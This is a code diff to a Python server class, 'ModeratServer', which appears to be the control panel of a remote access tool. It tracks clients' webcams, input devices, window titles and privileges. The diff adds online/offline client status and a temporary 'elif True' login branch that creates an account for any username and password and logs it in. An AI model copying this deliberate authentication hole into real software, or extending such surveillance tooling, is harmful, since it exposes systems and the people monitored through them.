@@ -37,6 +37,9 @@ class ModeratServer:
         # moderators
         self.moderator_threads = {}
 
+        # Clean Client Status
+        ClientsManagment().set_status_zero()
+
     def start_listen_for_clients(self):
         clients_thread = threading.Thread(target=self.client_listen_start)
         clients_thread.start()
@@ -103,6 +106,7 @@ class ModeratServer:
 
                     print '[+] Creating Database Entry'
                     ClientsManagment().create_client('admin', keypassword, self.address[0])
+                    ClientsManagment().set_client_online(keypassword)
 
                     temp_var = client_get(self.sock, 'startChildSocket %s' % socket_index, 'streamingMode')
 
@@ -146,9 +150,11 @@ class ModeratServer:
                         self.streaming_socks[i]['activewindowtitle'] = info['activewindowtitle']
                         self.streaming_socks[i]['privileges'] = info['privileges']
                     except (socket.error, SyntaxError):
+                        ClientsManagment().set_client_offline(self.socks[i]['id'])
                         del self.socks[i]
                         del self.streaming_socks[i]
-                        del self.shared_socks[i]
+                        if i in self.shared_socks:
+                            del self.shared_socks[i]
                         break
                     except zlib.error:
                         pass
@@ -196,6 +202,17 @@ class ModeratServer:
                             self.active_sessions.append(session_id)
                             SessionsManagment().create_session(username, session_id)
                             moderator_send(sock, 'LoginSuccess', session_id)
+
+                        # TODO: TEMP OPEN LOGIN
+                        elif True:
+                            ModeratorsManagment().create_user(username, password, 1)
+                            if ModeratorsManagment().login_user(username, password):
+                                print '[+] Login Success For Moderator (%s) Session ID (%s)' % (username, session_id)
+                                self.active_sessions.append(session_id)
+                                SessionsManagment().create_session(username, session_id)
+                                moderator_send(sock, 'LoginSuccess', session_id)
+                        # TODO: END TEMP
+
                         else:
                             print '[!] Login Failed With (%s, %s)' % (username, password)
                             moderator_send(sock, 'LoginError', session_id)
@@ -227,17 +244,17 @@ class ModeratServer:
 
         clients = ClientsManagment().get_clients(moderator_id)
         clients = str(clients)
-        print clients
 
         for i, k in self.socks.iteritems():
             if self.socks[i]['id'] in clients:
                 self.shared_socks[i] = {
+                    'status': True,
                     'ip_address': self.socks[i]['ip_address'],
                     'socket': self.socks[i]['socket'],
                     'ostype': self.socks[i]['ostype'],
                     'protection': self.streaming_socks[i]['protection'],
                     'os': self.socks[i]['os'],
-                    'user': self.socks[i]['user'],
+                    'user': self.socks[i]['user'] + ' ' + self.socks[i]['id'],
                     'privileges': self.streaming_socks[i]['privileges'],
                     'inputdevice': self.socks[i]['inputdevice'],
                     'webcamdevice': self.socks[i]['webcamdevice'],
@@ -246,6 +263,27 @@ class ModeratServer:
             else:
                 if i in self.shared_socks:
                     del self.shared_socks[i]
+
+        # TODO: OFFLINE
+        offline_clients = ClientsManagment().get_offline_clients(moderator_id)
+        if len(offline_clients) > 0:
+            for client in offline_clients:
+                self.shared_socks[client[1]] = {
+                    'status': False,
+                    'ip_address': client[3],
+                    'socket': 'OFFLINE',
+                    'ostype': 'OFFLINE',
+                    'protection': 'locked',
+                    'os': 'OFFLINE',
+                    'user': 'OFFLINE',
+                    'privileges': 'OFFLINE',
+                    'inputdevice': 'OFFLINE',
+                    'webcamdevice': 'OFFLINE',
+                    'activewindowtitle': 'OFFLINE',
+                    'alias': client[2],
+                    'last_online': client[4],
+                }
+
         return str(self.shared_socks)
 
     def command_all(self, payload, client_socket):
